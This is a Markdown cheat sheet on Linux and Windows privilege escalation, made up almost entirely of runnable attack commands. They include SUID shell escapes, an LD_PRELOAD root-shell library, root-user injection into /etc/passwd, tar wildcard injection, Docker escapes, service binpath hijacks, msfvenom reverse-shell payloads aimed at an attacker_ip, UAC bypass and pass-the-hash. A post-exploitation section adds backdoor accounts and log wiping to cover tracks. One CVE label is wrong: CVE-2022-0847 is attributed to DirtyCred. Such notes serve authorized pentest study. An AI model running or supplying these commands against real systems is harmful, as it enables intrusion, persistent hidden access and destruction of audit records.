# Privilege Escalation

## Overview

Privilege escalation involves exploiting vulnerabilities, misconfigurations, or weak access controls to gain elevated access to resources.

---

## Linux Privilege Escalation

### Enumeration Scripts
```bash
# LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Linux Smart Enumeration (LSE)
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
chmod +x lse.sh
./lse.sh -l 1  # Level 1 (basic)
./lse.sh -l 2  # Level 2 (detailed)

# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

### Manual Enumeration
```bash
# System information
uname -a
cat /etc/issue
cat /etc/*-release
cat /proc/version
hostname

# Current user
id
whoami
groups
sudo -l

# Users
cat /etc/passwd
cat /etc/shadow  # If readable
cat /etc/group

# Network
ifconfig
ip a
ip route
arp -a
netstat -antup
ss -antup

# Processes
ps aux
ps -ef
top

# Scheduled tasks
crontab -l
ls -la /etc/cron*
cat /etc/crontab
systemctl list-timers

# SUID/SGID files
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Writable files/directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Installed software
dpkg -l  # Debian/Ubuntu
rpm -qa  # RedHat/CentOS

# Home directories
ls -la /home
ls -la /root

# SSH keys
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find / -name authorized_keys 2>/dev/null

# Configuration files
cat /etc/sysconfig/network-scripts/ifcfg-*
cat /etc/fstab
cat /etc/exports
```

### SUID Exploitation
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# GTFOBins - Exploit SUID binaries
# https://gtfobins.github.io/

# Examples:

# find
find . -exec /bin/sh -p \; -quit

# vim
vim -c ':!/bin/sh'

# nmap (old versions)
nmap --interactive
!sh

# less
less /etc/passwd
!/bin/sh

# more
more /etc/passwd
!/bin/sh

# cp (overwrite /etc/passwd)
cp /etc/passwd /tmp/passwd.bak
echo 'root2::0:0:root:/root:/bin/bash' >> /tmp/passwd.bak
cp /tmp/passwd.bak /etc/passwd

# Custom SUID binary exploitation
# If custom binary has SUID and calls system() without absolute path
export PATH=/tmp:$PATH
echo '/bin/bash' > /tmp/custom_command
chmod +x /tmp/custom_command
./suid_binary
```

### Sudo Exploitation
```bash
# Check sudo privileges
sudo -l

# Run commands as other users
sudo -u otheruser command

# Sudo with NOPASSWD
# If user can run specific commands without password

# LD_PRELOAD
# If env_keep+=LD_PRELOAD
# Create malicious shared library
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

# Compile
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# Execute
sudo LD_PRELOAD=/tmp/shell.so <sudo_command>

# Sudo version exploits
# CVE-2021-3156 (Baron Samedit)
# Affects sudo versions < 1.9.5p2
```

### Cron Jobs
```bash
# Check cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron*
systemctl list-timers

# If writable cron script
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/cron/script.sh

# PATH in cron
# If cron job doesn't use absolute paths
# Create malicious script in PATH
```

### Writable /etc/passwd
```bash
# Check if writable
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt salt password123

# Add root user
echo 'root2:$1$salt$qMJwmKHBWPtKX.1mH9pDz0:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login as new root user
su root2
```

### Capabilities
```bash
# Find capabilities
getcap -r / 2>/dev/null

# Exploit capabilities
# cap_setuid
/path/to/binary -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_dac_read_search
# Read any file

# cap_sys_admin
# Mount filesystem
```

### Kernel Exploits
```bash
# Check kernel version
uname -a
cat /proc/version

# Search for exploits
searchsploit kernel <version>

# Common kernel exploits
# Dirty COW (CVE-2016-5195)
# DirtyCred (CVE-2022-0847)
# PwnKit (CVE-2021-4034)
```

### NFS Exploitation
```bash
# Check NFS shares
showmount -e target_ip

# Mount NFS share
mount -t nfs target_ip:/share /mnt/nfs

# If no_root_squash
# Create SUID binary on attacker machine
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# On target machine
/share/bash -p
```

### Docker Escape
```bash
# If user in docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Privileged container
docker run --rm -it --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host
```

### Wildcard Injection
```bash
# If script uses wildcards with commands like tar, rsync, etc.
# tar example
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /tmp/shell.sh
chmod +x /tmp/shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh /tmp/shell.sh"
```

---

## Windows Privilege Escalation

### Enumeration Scripts
```powershell
# WinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
.\winPEASx64.exe

# PowerUp
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe all

# Windows Exploit Suggester
python windows-exploit-suggester.py --database <db> --systeminfo systeminfo.txt

# PrivescCheck
. .\PrivescCheck.ps1
Invoke-PrivescCheck
```

### Manual Enumeration
```powershell
# System information
systeminfo
hostname
whoami
whoami /priv
whoami /groups
net user
net user <username>
net localgroup
net localgroup administrators

# Network
ipconfig /all
route print
arp -A
netstat -ano

# Firewall
netsh firewall show state
netsh firewall show config
netsh advfirewall firewall show rule name=all

# Scheduled tasks
schtasks /query /fo LIST /v

# Running processes
tasklist /svc
wmic process list brief
Get-Process

# Services
sc query
Get-Service
wmic service list brief

# Installed software
wmic product get name,version
Get-WmiObject -Class Win32_Product

# Patch level
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Drives
wmic logicaldisk get caption,description,providername
fsutil fsinfo drives

# Credentials
cmdkey /list
```

### Unquoted Service Path
```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notmatch "`"" -and $_.PathName -notmatch "C:\\Windows"} | Select Name,PathName,StartMode

# Exploit
# If path is C:\Program Files\Some Folder\service.exe
# Create malicious executable at:
# C:\Program.exe
# C:\Program Files\Some.exe
```

### Weak Service Permissions
```powershell
# Check service permissions
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv <username> *

# If SERVICE_CHANGE_CONFIG
sc config <service> binpath= "net localgroup administrators <username> /add"
sc stop <service>
sc start <service>

# If SERVICE_ALL_ACCESS
sc config <service> binpath= "C:\path\to\malicious.exe"
net start <service>
```

### Registry Autoruns
```powershell
# Check autorun programs
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# If writable
# Replace with malicious executable
```

### AlwaysInstallElevated
```powershell
# Check if enabled
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both return 1
# Create malicious MSI
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi -o installer.msi

# Install
msiexec /quiet /qn /i installer.msi
```

### Stored Credentials
```powershell
# Saved credentials
cmdkey /list

# Use saved credentials
runas /savecred /user:admin cmd.exe

# Unattended install files
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\Sysprep\Sysprep.xml

# IIS web.config
C:\inetpub\wwwroot\web.config

# Group Policy Preferences
# SYSVOL\domain.com\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
# Decrypt cpassword with gpp-decrypt
```

### Token Impersonation
```powershell
# Check privileges
whoami /priv

# SeImpersonatePrivilege
# Use Juicy Potato, Rogue Potato, PrintSpoofer
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net localgroup administrators <user> /add" -t *

# PrintSpoofer
.\PrintSpoofer.exe -i -c cmd

# SeDebugPrivilege
# Can access any process memory
```

### DLL Hijacking
```powershell
# Find missing DLLs
# Use Process Monitor to find missing DLLs loaded by privileged processes

# Create malicious DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f dll -o malicious.dll

# Place in writable directory in DLL search order
```

### UAC Bypass
```powershell
# eventvwr.exe
# fodhelper.exe
# computerdefaults.exe

# Example: fodhelper UAC bypass
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f
fodhelper.exe
```

### Pass-the-Hash
```bash
# PSExec with hash
pth-winexe -U 'DOMAIN/user%hash' //target cmd

# Impacket
impacket-psexec -hashes :<NTLM> administrator@target
impacket-wmiexec -hashes :<NTLM> administrator@target

# CrackMapExec
crackmapexec smb target -u administrator -H <NTLM>
```

### Kernel Exploits
```powershell
# Check for missing patches
systeminfo
wmic qfe list

# Common Windows exploits
# MS16-032
# MS17-010 (EternalBlue)
# CVE-2020-0787
# PrintNightmare (CVE-2021-34527)
```

---

## General Privilege Escalation Techniques

### Credential Hunting
```bash
# Linux
grep -r "password" /etc 2>/dev/null
grep -r "pass" /var/www 2>/dev/null
find / -name "*.conf" -exec grep -i "password" {} \; 2>/dev/null
history

# Windows
findstr /si password *.txt *.xml *.config *.ini
dir /s *pass* == *cred* == *vnc* == *.config*
```

### Environment Variables
```bash
# Check for sensitive info
env
printenv

# PATH hijacking
export PATH=/tmp:$PATH
```

### Logs
```bash
# Linux logs
/var/log/auth.log
/var/log/syslog
/var/log/apache2/access.log

# Windows Event Logs
wevtutil qe Security /f:text /rd:true
Get-EventLog -LogName Security -Newest 100
```

### Database Credentials
```bash
# Configuration files
/var/www/html/config.php
C:\inetpub\wwwroot\web.config

# Connect to database
mysql -u root -p<password>
USE database;
SELECT * FROM users;
```

---

## Post-Exploitation

### Maintaining Access
```bash
# Add SSH key (Linux)
mkdir /root/.ssh
echo "ssh-rsa AAAA..." > /root/.ssh/authorized_keys

# Create user (Linux)
useradd -m -s /bin/bash backdoor
echo "backdoor:password" | chpasswd
usermod -aG sudo backdoor

# Create user (Windows)
net user backdoor password /add
net localgroup administrators backdoor /add
```

### Covering Tracks
```bash
# Clear logs (Linux)
echo "" > /var/log/auth.log
echo "" > ~/.bash_history
history -c

# Clear logs (Windows)
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

---

## Privilege Escalation Resources

### Websites
- GTFOBins: https://gtfobins.github.io/
- LOLBAS: https://lolbas-project.github.io/
- HackTricks: https://book.hacktricks.xyz/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings

### Tools
- LinPEAS / WinPEAS
- Linux Exploit Suggester
- Windows Exploit Suggester
- BeRoot
- Unix-privesc-check

### Checklists
- See `cheatsheets/linux-privesc.md`
- See `cheatsheets/windows-privesc.md`

---

## Further Reading

- Windows Privilege Escalation Fundamentals
- Linux Privilege Escalation for Beginners
- OSCP Privilege Escalation Guide
- Privilege Escalation (Offensive Security)
